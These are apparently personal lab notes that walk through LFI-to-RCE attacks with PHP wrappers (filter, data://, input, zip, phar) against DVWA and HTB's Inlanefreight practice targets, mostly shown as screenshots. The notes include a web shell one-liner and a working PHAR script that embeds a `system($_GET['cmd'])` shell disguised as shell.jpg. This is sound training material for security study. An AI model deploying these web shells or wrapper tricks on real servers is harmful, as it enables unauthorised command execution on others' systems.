# Advanced Labs (Wrapper attacks)

Common target for all exercise ahead is inlanefreight (HTB) & DVWA

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

No security is in place and allow\_url\_include is set to On which is required for all the below wrappers used.

## PHP Wrapper (Filter)

PHP filters are a type of PHP wrapper, where we can pass different types of input and have it filtered by the filter we specify.

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

## RRCE using (data:// wrapper)

With allow\_url\_include we can proceed with our data wrapper attack. It can be used to include external data, including PHP code. It feeds code directly into PHP memory.

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

#### Example in DVWA

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

## RCE using (PHP Wrapper (INPUT))

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Note:** _To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $\_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. \<?php system('id')?>)_
{% endhint %}

**Example in DVWA**

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

## RCE Using (zip wrapper) (Combination of File upload and LFI to RCE)

#### DVWA Example&#x20;

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

For ease of exploitation, I’ve moved shell.jpg to desired folder.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

File path exploitation using file from the uploaded location. Finally done 😅.

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

## RCE using (PHAR wrapper)

Thus, we’re going to create a new phar file and add our payload inside it.

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows:

<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Let's upload this file using file upload functionality.&#x20;

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

For ease of exploitation I've manually copied the jpg file in current directory for exploitation. The actual exploitation image is in the next image which is through burp.&#x20;

<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
